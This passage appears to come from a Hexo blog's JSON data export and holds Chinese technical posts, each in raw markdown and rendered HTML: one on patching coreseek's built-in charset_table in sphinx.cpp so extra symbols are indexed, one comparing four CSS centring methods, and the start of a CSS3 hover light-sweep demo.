就可以了，因为只有charset_table包含的字符才会被sphinx识别并编入索引中。但coreseek中charset_table却不能用，因为这个配置还担任了中文分词开关的角色，就是说如果在配置文件里填写了这个配置，那么中文分词就不会开启，鱼和熊掌不能兼得。\n\n有一个方法，就是修改它程序内置的charset_table配置，这样既能不关闭中文分词，又能添加新的字符给索引识别出来。\n\n找到源码包中的c++文件： <span style=\"color: #000000;\">coreseek-3.2.13/csft-3.2.13/src/sphinx.cpp</span>\n<div style=\"color: #000000;\">\n```\n// 修改 197..198 行\n// old:\nconst char *    SPHINX_DEFAULT_SBCS_TABLE       = \"0..9, A..Z->a..z, _, a..z, U+A8->U+B8, U+B8, U+C0..U+DF->U+E0..U+FF, U+E0..U+FF\";\nconst char *    SPHINX_DEFAULT_UTF8_TABLE       = \"0..9, A..Z->a..z, _, a..z, U+410..U+42F->U+430..U+44F, U+430..U+44F\";\n// --------------------------------------------\n// 添加了 :  +, -, {, }, |, =, >, <  这些符号\nconst char *    SPHINX_DEFAULT_SBCS_TABLE       = \"0..9, A..Z->a..z, _, +, -, {, }, |, =, >, <, a..z, U+A8->U+B8, U+B8, U+C0..U+DF->U+E0..U+FF, U+E0..U+FF\";\nconst char *    SPHINX_DEFAULT_UTF8_TABLE       = \"0..9, A..Z->a..z, _, +, -, {, }, |, =, >, <, a..z, U+410..U+42F->U+430..U+44F, U+430..U+44F\";\n```\n然后重新编译一遍 coreseek，覆盖原先的执行文件如 bin/searchd bin/indexer 。重启searchd并重新编排索引就可以生效。\n\n</div>","source":"_posts/coreseek-e4-b8-ad-e6-96-87-e5-88-86-e8-af-8d-e9-85-8d-e7-bd-ae.md","raw":"---\ntitle: coreseek中文分词配置\nid: 21\ncategories:\n  - sphinx\ndate: 2014-06-27 23:46:59\ntags:\n---\n\n在安装配置coreseek 3.2.13 中积累了一些问题，在这里记录下来:\n\n### 1\\. 让一些特殊字符也能被检索，比如 +- （加减号）\n\n正常来说修改主配置文件sphinx.conf的 index.charset_table 就可以了，因为只有charset_table包含的字符才会被sphinx识别并编入索引中。但coreseek中charset_table却不能用，因为这个配置还担任了中文分词开关的角色，就是说如果在配置文件里填写了这个配置，那么中文分词就不会开启，鱼和熊掌不能兼得。\n\n有一个方法，就是修改它程序内置的charset_table配置，这样既能不关闭中文分词，又能添加新的字符给索引识别出来。\n\n找到源码包中的c++文件： <span style=\"color: #000000;\">coreseek-3.2.13/csft-3.2.13/src/sphinx.cpp</span>\n<div style=\"color: #000000;\">\n```\n// 修改 197..198 行\n// old:\nconst char *    SPHINX_DEFAULT_SBCS_TABLE       = \"0..9, A..Z->a..z, _, a..z, U+A8->U+B8, U+B8, U+C0..U+DF->U+E0..U+FF, U+E0..U+FF\";\nconst char *    SPHINX_DEFAULT_UTF8_TABLE       = \"0..9, A..Z->a..z, _, a..z, U+410..U+42F->U+430..U+44F, U+430..U+44F\";\n// --------------------------------------------\n// 添加了 :  +, -, {, }, |, =, >, <  这些符号\nconst char *    SPHINX_DEFAULT_SBCS_TABLE       = \"0..9, A..Z->a..z, _, +, -, {, }, |, =, >, <, a..z, U+A8->U+B8, U+B8, U+C0..U+DF->U+E0..U+FF, U+E0..U+FF\";\nconst char *    SPHINX_DEFAULT_UTF8_TABLE       = \"0..9, A..Z->a..z, _, +, -, {, }, |, =, >, <, a..z, U+410..U+42F->U+430..U+44F, U+430..U+44F\";\n```\n然后重新编译一遍 coreseek，覆盖原先的执行文件如 bin/searchd bin/indexer 。重启searchd并重新编排索引就可以生效。\n\n</div>","slug":"coreseek-e4-b8-ad-e6-96-87-e5-88-86-e8-af-8d-e9-85-8d-e7-bd-ae","published":1,"updated":"2018-03-05T12:57:51.549Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhut000flzlmbb5wgtjk","content":"<p>在安装配置coreseek 3.2.13 中积累了一些问题，在这里记录下来:</p>\n<h3 id=\"1-让一些特殊字符也能被检索，比如-（加减号）\"><a href=\"#1-让一些特殊字符也能被检索，比如-（加减号）\" class=\"headerlink\" title=\"1. 让一些特殊字符也能被检索，比如 +- （加减号）\"></a>1. 让一些特殊字符也能被检索，比如 +- （加减号）</h3><p>正常来说修改主配置文件sphinx.conf的 index.charset_table 就可以了，因为只有charset_table包含的字符才会被sphinx识别并编入索引中。但coreseek中charset_table却不能用，因为这个配置还担任了中文分词开关的角色，就是说如果在配置文件里填写了这个配置，那么中文分词就不会开启，鱼和熊掌不能兼得。</p>\n<p>有一个方法，就是修改它程序内置的charset_table配置，这样既能不关闭中文分词，又能添加新的字符给索引识别出来。</p>\n<p>找到源码包中的c++文件： <span style=\"color: #000000;\">coreseek-3.2.13/csft-3.2.13/src/sphinx.cpp</span></p>\n<div style=\"color: #000000;\"><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 修改 197..198 行</span><br><span class=\"line\">// old:</span><br><span class=\"line\">const char *    SPHINX_DEFAULT_SBCS_TABLE       = &quot;0..9, A..Z-&gt;a..z, _, a..z, U+A8-&gt;U+B8, U+B8, U+C0..U+DF-&gt;U+E0..U+FF, U+E0..U+FF&quot;;</span><br><span class=\"line\">const char *    SPHINX_DEFAULT_UTF8_TABLE       = &quot;0..9, A..Z-&gt;a..z, _, a..z, U+410..U+42F-&gt;U+430..U+44F, U+430..U+44F&quot;;</span><br><span class=\"line\">// --------------------------------------------</span><br><span class=\"line\">// 添加了 :  +, -, &#123;, &#125;, |, =, &gt;, &lt;  这些符号</span><br><span class=\"line\">const char *    SPHINX_DEFAULT_SBCS_TABLE       = &quot;0..9, A..Z-&gt;a..z, _, +, -, &#123;, &#125;, |, =, &gt;, &lt;, a..z, U+A8-&gt;U+B8, U+B8, U+C0..U+DF-&gt;U+E0..U+FF, U+E0..U+FF&quot;;</span><br><span class=\"line\">const char *    SPHINX_DEFAULT_UTF8_TABLE       = &quot;0..9, A..Z-&gt;a..z, _, +, -, &#123;, &#125;, |, =, &gt;, &lt;, a..z, U+410..U+42F-&gt;U+430..U+44F, U+430..U+44F&quot;;</span><br></pre></td></tr></table></figure><br><br>然后重新编译一遍 coreseek，覆盖原先的执行文件如 bin/searchd bin/indexer 。重启searchd并重新编排索引就可以生效。<br><br></div>","site":{"data":{}},"excerpt":"","more":"<p>在安装配置coreseek 3.2.13 中积累了一些问题，在这里记录下来:</p>\n<h3 id=\"1-让一些特殊字符也能被检索，比如-（加减号）\"><a href=\"#1-让一些特殊字符也能被检索，比如-（加减号）\" class=\"headerlink\" title=\"1. 让一些特殊字符也能被检索，比如 +- （加减号）\"></a>1. 让一些特殊字符也能被检索，比如 +- （加减号）</h3><p>正常来说修改主配置文件sphinx.conf的 index.charset_table 就可以了，因为只有charset_table包含的字符才会被sphinx识别并编入索引中。但coreseek中charset_table却不能用，因为这个配置还担任了中文分词开关的角色，就是说如果在配置文件里填写了这个配置，那么中文分词就不会开启，鱼和熊掌不能兼得。</p>\n<p>有一个方法，就是修改它程序内置的charset_table配置，这样既能不关闭中文分词，又能添加新的字符给索引识别出来。</p>\n<p>找到源码包中的c++文件： <span style=\"color: #000000;\">coreseek-3.2.13/csft-3.2.13/src/sphinx.cpp</span></p>\n<div style=\"color: #000000;\"><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 修改 197..198 行</span><br><span class=\"line\">// old:</span><br><span class=\"line\">const char *    SPHINX_DEFAULT_SBCS_TABLE       = &quot;0..9, A..Z-&gt;a..z, _, a..z, U+A8-&gt;U+B8, U+B8, U+C0..U+DF-&gt;U+E0..U+FF, U+E0..U+FF&quot;;</span><br><span class=\"line\">const char *    SPHINX_DEFAULT_UTF8_TABLE       = &quot;0..9, A..Z-&gt;a..z, _, a..z, U+410..U+42F-&gt;U+430..U+44F, U+430..U+44F&quot;;</span><br><span class=\"line\">// --------------------------------------------</span><br><span class=\"line\">// 添加了 :  +, -, &#123;, &#125;, |, =, &gt;, &lt;  这些符号</span><br><span class=\"line\">const char *    SPHINX_DEFAULT_SBCS_TABLE       = &quot;0..9, A..Z-&gt;a..z, _, +, -, &#123;, &#125;, |, =, &gt;, &lt;, a..z, U+A8-&gt;U+B8, U+B8, U+C0..U+DF-&gt;U+E0..U+FF, U+E0..U+FF&quot;;</span><br><span class=\"line\">const char *    SPHINX_DEFAULT_UTF8_TABLE       = &quot;0..9, A..Z-&gt;a..z, _, +, -, &#123;, &#125;, |, =, &gt;, &lt;, a..z, U+410..U+42F-&gt;U+430..U+44F, U+430..U+44F&quot;;</span><br></pre></td></tr></table></figure><br><br>然后重新编译一遍 coreseek，覆盖原先的执行文件如 bin/searchd bin/indexer 。重启searchd并重新编排索引就可以生效。<br><br></div>"},{"title":"css垂直水平居中复习","id":"338","date":"2018-02-16T13:45:42.000Z","_content":"\n对于父容器高宽未知的居中方案，我了解的有四种\n\n在codepen上重新手写了一遍复习：[https://codepen.io/joaner/pen/ddZQQw](https://codepen.io/joaner/pen/ddZQQw)\n\n## 1. table-cell + vertical-align\n\n```\n<div>\n <div style=\"display: table; width: 100%; height: 100%;\">\n <span style=\"display: table-cell; vertical-align: middle; text-align: center;\">table-cell</span>\n </div>\n</div>\n```\n\n## 2. flex + align-items + justify-content\n```\n<div>\n <div style=\"display: flex; align-items: center; justify-content: center; height: 100%;\">\n  <span>flexbox</span>\n </div>\n</div>\n```\n\n## 3. absolute + margin: auto\n\n```\n<div>\n <div style=\"position: relative; height: 100%\">\n  <span style=\"position: absolute; top: 0; left: 0; right: 0; bottom: 0; margin: auto; width: 70px; height: 20px;\">position</span>\n </div>\n</div>\n```\n\n## 4. transform: translate(-50%, -50%)\n\n```\n<div>\n <div style=\"position: relative; height: 100%;\">\n  <span style=\"position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%)\">transform</span>\n </div>\n</div>\n```\n\n----\n\n以上，我习惯用 `table-cell` 和 `position: absolute + margin: auto` 方案，因为以前在IE下兼容性好些。\n\n但现在主流浏览器都已支持`flexbox`，所以更加推荐这个方案，适用性更强。\n","source":"_posts/css-e5-9e-82-e7-9b-b4-e6-b0-b4-e5-b9-b3-e5-b1-85-e4-b8-ad-e5-a4-8d-e4-b9-a0.md","raw":"---\ntitle: css垂直水平居中复习\nid: 338\ncategories:\n  - 前端\ndate: 2018-02-16 21:45:42\ntags:\n---\n\n对于父容器高宽未知的居中方案，我了解的有四种\n\n在codepen上重新手写了一遍复习：[https://codepen.io/joaner/pen/ddZQQw](https://codepen.io/joaner/pen/ddZQQw)\n\n## 1. table-cell + vertical-align\n\n```\n<div>\n <div style=\"display: table; width: 100%; height: 100%;\">\n <span style=\"display: table-cell; vertical-align: middle; text-align: center;\">table-cell</span>\n </div>\n</div>\n```\n\n## 2. flex + align-items + justify-content\n```\n<div>\n <div style=\"display: flex; align-items: center; justify-content: center; height: 100%;\">\n  <span>flexbox</span>\n </div>\n</div>\n```\n\n## 3. absolute + margin: auto\n\n```\n<div>\n <div style=\"position: relative; height: 100%\">\n  <span style=\"position: absolute; top: 0; left: 0; right: 0; bottom: 0; margin: auto; width: 70px; height: 20px;\">position</span>\n </div>\n</div>\n```\n\n## 4. transform: translate(-50%, -50%)\n\n```\n<div>\n <div style=\"position: relative; height: 100%;\">\n  <span style=\"position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%)\">transform</span>\n </div>\n</div>\n```\n\n----\n\n以上，我习惯用 `table-cell` 和 `position: absolute + margin: auto` 方案，因为以前在IE下兼容性好些。\n\n但现在主流浏览器都已支持`flexbox`，所以更加推荐这个方案，适用性更强。\n","slug":"css-e5-9e-82-e7-9b-b4-e6-b0-b4-e5-b9-b3-e5-b1-85-e4-b8-ad-e5-a4-8d-e4-b9-a0","published":1,"updated":"2018-03-06T10:26:10.606Z","_id":"cjef4yhuw000ilzlmspa3lgx5","comments":1,"layout":"post","photos":[],"link":"","content":"<p>对于父容器高宽未知的居中方案，我了解的有四种</p>\n<p>在codepen上重新手写了一遍复习：<a href=\"https://codepen.io/joaner/pen/ddZQQw\" target=\"_blank\" rel=\"noopener\">https://codepen.io/joaner/pen/ddZQQw</a></p>\n<h2 id=\"1-table-cell-vertical-align\"><a href=\"#1-table-cell-vertical-align\" class=\"headerlink\" title=\"1. table-cell + vertical-align\"></a>1. table-cell + vertical-align</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div&gt;</span><br><span class=\"line\"> &lt;div style=&quot;display: table; width: 100%; height: 100%;&quot;&gt;</span><br><span class=\"line\"> &lt;span style=&quot;display: table-cell; vertical-align: middle; text-align: center;&quot;&gt;table-cell&lt;/span&gt;</span><br><span class=\"line\"> &lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-flex-align-items-justify-content\"><a href=\"#2-flex-align-items-justify-content\" class=\"headerlink\" title=\"2. flex + align-items + justify-content\"></a>2. flex + align-items + justify-content</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div&gt;</span><br><span class=\"line\"> &lt;div style=&quot;display: flex; align-items: center; justify-content: center; height: 100%;&quot;&gt;</span><br><span class=\"line\">  &lt;span&gt;flexbox&lt;/span&gt;</span><br><span class=\"line\"> &lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-absolute-margin-auto\"><a href=\"#3-absolute-margin-auto\" class=\"headerlink\" title=\"3. absolute + margin: auto\"></a>3. absolute + margin: auto</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div&gt;</span><br><span class=\"line\"> &lt;div style=&quot;position: relative; height: 100%&quot;&gt;</span><br><span class=\"line\">  &lt;span style=&quot;position: absolute; top: 0; left: 0; right: 0; bottom: 0; margin: auto; width: 70px; height: 20px;&quot;&gt;position&lt;/span&gt;</span><br><span class=\"line\"> &lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"4-transform-translate-50-50\"><a href=\"#4-transform-translate-50-50\" class=\"headerlink\" title=\"4. transform: translate(-50%, -50%)\"></a>4. transform: translate(-50%, -50%)</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div&gt;</span><br><span class=\"line\"> &lt;div style=&quot;position: relative; height: 100%;&quot;&gt;</span><br><span class=\"line\">  &lt;span style=&quot;position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%)&quot;&gt;transform&lt;/span&gt;</span><br><span class=\"line\"> &lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n<hr>\n<p>以上，我习惯用 <code>table-cell</code> 和 <code>position: absolute + margin: auto</code> 方案，因为以前在IE下兼容性好些。</p>\n<p>但现在主流浏览器都已支持<code>flexbox</code>，所以更加推荐这个方案，适用性更强。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>对于父容器高宽未知的居中方案，我了解的有四种</p>\n<p>在codepen上重新手写了一遍复习：<a href=\"https://codepen.io/joaner/pen/ddZQQw\" target=\"_blank\" rel=\"noopener\">https://codepen.io/joaner/pen/ddZQQw</a></p>\n<h2 id=\"1-table-cell-vertical-align\"><a href=\"#1-table-cell-vertical-align\" class=\"headerlink\" title=\"1. table-cell + vertical-align\"></a>1. table-cell + vertical-align</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div&gt;</span><br><span class=\"line\"> &lt;div style=&quot;display: table; width: 100%; height: 100%;&quot;&gt;</span><br><span class=\"line\"> &lt;span style=&quot;display: table-cell; vertical-align: middle; text-align: center;&quot;&gt;table-cell&lt;/span&gt;</span><br><span class=\"line\"> &lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-flex-align-items-justify-content\"><a href=\"#2-flex-align-items-justify-content\" class=\"headerlink\" title=\"2. flex + align-items + justify-content\"></a>2. flex + align-items + justify-content</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div&gt;</span><br><span class=\"line\"> &lt;div style=&quot;display: flex; align-items: center; justify-content: center; height: 100%;&quot;&gt;</span><br><span class=\"line\">  &lt;span&gt;flexbox&lt;/span&gt;</span><br><span class=\"line\"> &lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-absolute-margin-auto\"><a href=\"#3-absolute-margin-auto\" class=\"headerlink\" title=\"3. absolute + margin: auto\"></a>3. absolute + margin: auto</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div&gt;</span><br><span class=\"line\"> &lt;div style=&quot;position: relative; height: 100%&quot;&gt;</span><br><span class=\"line\">  &lt;span style=&quot;position: absolute; top: 0; left: 0; right: 0; bottom: 0; margin: auto; width: 70px; height: 20px;&quot;&gt;position&lt;/span&gt;</span><br><span class=\"line\"> &lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"4-transform-translate-50-50\"><a href=\"#4-transform-translate-50-50\" class=\"headerlink\" title=\"4. transform: translate(-50%, -50%)\"></a>4. transform: translate(-50%, -50%)</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div&gt;</span><br><span class=\"line\"> &lt;div style=&quot;position: relative; height: 100%;&quot;&gt;</span><br><span class=\"line\">  &lt;span style=&quot;position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%)&quot;&gt;transform&lt;/span&gt;</span><br><span class=\"line\"> &lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n<hr>\n<p>以上，我习惯用 <code>table-cell</code> 和 <code>position: absolute + margin: auto</code> 方案，因为以前在IE下兼容性好些。</p>\n<p>但现在主流浏览器都已支持<code>flexbox</code>，所以更加推荐这个方案，适用性更强。</p>\n"},{"title":"CSS3封面闪光的效果","id":"323","date":"2018-01-21T08:03:01.000Z","_content":"\n鼠标移到封面图片上时，一个光线扫射过的小demo。\n\n## 效果预览\n\n[https://codepen.io/joaner/pen/YYBNpw](https://codepen.io/joaner/pen/YYBNpw)\n\n```\n<div class=\"thumb\">\n  <img src=\"http://img31.mtime.cn/mt/2014/02/22/235109.78042753_96X128.jpg\" />\n</div>\n```\n\n## 光线\n\n可以用`.thumb::before`来展示光线\n\n首先需要创建光线的元素，使用线性左右渐进[linear-gradient](https://developer.mozilla.org/zh-CN/docs/Web/CSS/linear-gradient)\n\n```\nbackground: linear-gradient(\n  to right,\n  transparent 0%,\n  rgba(255,255,255,.5) 50%,\n  transparent 100%\n);\n```\n其次光线一般是斜射，使用 [transform: skewX(145deg)](https://developer.mozilla.org/zh-CN/docs/Web/CSS/transform) 来偏移角度\n\n完整光线的代码：\n```\n.thumb {\n  position: relative;\n}\n.thumb img {\n  width: 100%;\n}\n\n.thumb::before {\n  content: '';\n  display: inline-block;\n  position: absolute;\n  left: -120px;\n  top: 0;\n  width: 60px;\n  height: 100%;\n  background: linear-gradient(to right, transparent 0%, rgba(255,255,255,.5) 50%, transparent 100%);\n  transform: skewX(145deg);\n}\n```\n\n## 动画\n\n这个光线动画由于是单向不可逆的，不适合用`transition`方案。\n\n`animation`方案:\n\n```\n.thumb:hover::before {\n  animation-name: light;\n  animation-timing-function: linear;\n  animation-duration: .5s;\n}\n\n@keyframes light {\n  from {\n    left: -120px;\n  }\n  to {\n    left: 100%;\n  }\n}\n```\n","source":"_posts/css3-e5-b0-81-e9-9d-a2-e9-97-aa-e5-85-89-e7-9a-84-e6-95-88-e6-9e-9c.md","raw":"---\ntitle: CSS3封面闪光的效果\nid: 323\ncategories:\n  - 前端\ndate: 2018-01-21 16:03:01\ntags:\n---\n\n鼠标移到封面图片上时，一个光线扫射过的小demo。\n\n## 效果预览\n\n[https://codepen.io/joaner/pen/YYBNpw](https://codepen.io/joaner/pen/YYBNpw)\n\n```\n<div class=\"thumb\">\n  <img src=\"http://img31.mtime.cn/mt/2014/02/22/235109.78042753_96X128.jpg\" />\n</div>\n```\n\n## 光线\n\n可以用`.thumb::before`来展示光线\n\n首先需要创建光线的元素，使用线性左右渐进[linear-gradient](https://developer.mozilla.org/zh-CN/docs/Web/CSS/linear-gradient)\n\n```\nbackground: linear-gradient(\n  to right,\n  transparent 0%,\n  rgba(255,255,255,.5) 50%,\n  transparent 100%\n);\n```\n其次光线一般是斜射，使用 [transform: skewX(145deg)](https://developer.mozilla.org/zh-CN/docs/Web/CSS/transform) 来偏移角度\n\n完整光线的代码：\n```\n.thumb {\n  position: relative;\n}\n.thumb img {\n  width: 100%;\n}\n\n.thumb::before {\n  content: '';\n  display: inline-block;\n  position: absolute;\n  left: -120px;\n  top: 0;\n  width: 60px;\n  height: 100%;\n  background: linear-gradient(to right, transparent 0%, rgba(255,255,255,.5) 50%, transparent 100%);\n  transform: skewX(145deg);\n}\n```\n\n## 动画\n\n这个光线动画由于是单向不可逆的，不适合用`transition`方案。\n\n`animation`方案:\n\n```\n.thumb:hover::before {\n  animation-name: light;\n  animation-timing-function: linear;\n  animation-duration: .5s;\n}\n\n@keyframes light {\n  from {\n    left: -120px;\n  }\n  to {\n    left: 100%;\n  }\n}\n```\n","slug":"css3-e5-b0-81-e9-9d-a2-e9-97-aa-e5-85-89-e7-9a-84-e6-95-88-e6-9e-9c","published":1,"updated":"2018-03-06T10:51:03.239Z","_id":"cjef4yhuz000klzlmrblv2gto","comments":1,"layout":"post","photos":[],"link":"","content":"<p>鼠标移到封面图片上时，一个光线扫射过的小demo。</p>\n<h2 id=\"效果预览\"><a href=\"#效果预览\" class=\"headerlink\" title=\"效果预览\"></a>效果预览</h2><p><a href=\"https://codepen.io/joaner/pen/YYBNpw\" target=\"_blank\" rel=\"noopener\">https://codepen.io/joaner/pen/YYBNpw</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div class=&quot;thumb&quot;&gt;</span><br><span class=\"line\">  &lt;img src=&quot;http://img31.mtime.cn/mt/2014/02/22/235109.78042753_96X128.jpg&quot; /&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"光线\"><a href=\"#光线\" class=\"headerlink\" title=\"光线\"></a>光线</h2><p>可以用<code>.thumb::before</code>来展示光线</p>\n<p>首先需要创建光线的元素，使用线性左右渐进<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/CSS/linear-gradient\" target=\"_blank\" rel=\"noopener\">linear-gradient</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">background: linear-gradient(</span><br><span class=\"line\">  to right,</span><br><span class=\"line\">  transparent 0%,</span><br><span class=\"line\">  rgba(255,255,255,.5) 50%,</span><br><span class=\"line\">  transparent 100%</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n<p>其次光线一般是斜射，使用 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/CSS/transform\" target=\"_blank\" rel=\"noopener\">transform: skewX(145deg)</a> 来偏移角度</p>\n<p>完整光线的代码：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.thumb &#123;</span><br><span class=\"line\">  position: relative;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.thumb img &#123;</span><br><span class=\"line\">  width: 100%;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">.thumb::before &#123;</span><br><span class=\"line\">  content: &apos;&apos;;</span><br><span class=\"line\">  display: inline-block;</span><br><span class=\"line\">  position: absolute;</span><br><span class=\"line\">  left: -120px;</span><br><span class=\"line\">  top: 0;</span><br><span class=\"line\">  width: 60px;</span><br><span class=\"line\">  height: 100%;</span><br><span class=\"line\">  background: linear-gradient(to right, transparent 0%, rgba(255,255,255,.5) 50%, transparent 100%);</span><br><span class=\"line\">  transform: skewX(145deg);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"动画\"><a href=\"#动画\" class=\"headerlink\" title=\"动画\"></a>动画</h2><p>这个光线动画由于是单向不可逆的，不适合用<code>transition</code>方案。</p>\n<p><code>animation</code>方案:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.thumb:hover::before &#123;</span><br><span class=\"line\">  animation-name: light;</span><br><span class=\"line\">  animation-timing-function: linear;</span><br><span class=\"line\">  animation-duration: .5s;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">@keyframes light &#123;</span><br><span class=\"line\">  from &#123;</span><br><span class=\"line\">    left: -120px;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  to &#123;</span><br><span class=\"line\">    left: 100%;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<p>鼠标移到封面图片上时，一个光线扫射过的小demo。</p>\n<h2 id=\"效果预览\"><a href=\"#效果预览\" class=\"headerlink\" title=\"效果预览\"></a>效果预览</h2><p><a href=\"https://codepen.io/joaner/pen/YYBNpw\" target=\"_blank\" rel=\"noopener\">https://codepen.io/joaner/pen/YYBNpw</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div class=&quot;thumb&quot;&gt;</span><br><span class=\"line\">  &lt;img src=&quot;http://img31.mtime.cn/mt/2014/02/22/235109.78042753_96X128.jpg&quot; /&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"光线\"><a href=\"#光线\" class=\"headerlink\" title=\"光线\"></a>光线</h2><p>可以用<code>.thumb::before</code>来展示光线</p>\n<p>首先需要创建光线的元素，使用线性左右渐进<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/CSS/linear-gradient\" target=\"_blank\" rel=\"noopener\">linear-gradient</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">background: linear-gradient(</span><br><span class=\"line\">  to right,</span><br><span class=\"line\">  transparent 0%,</span><br><span class=\"line\">  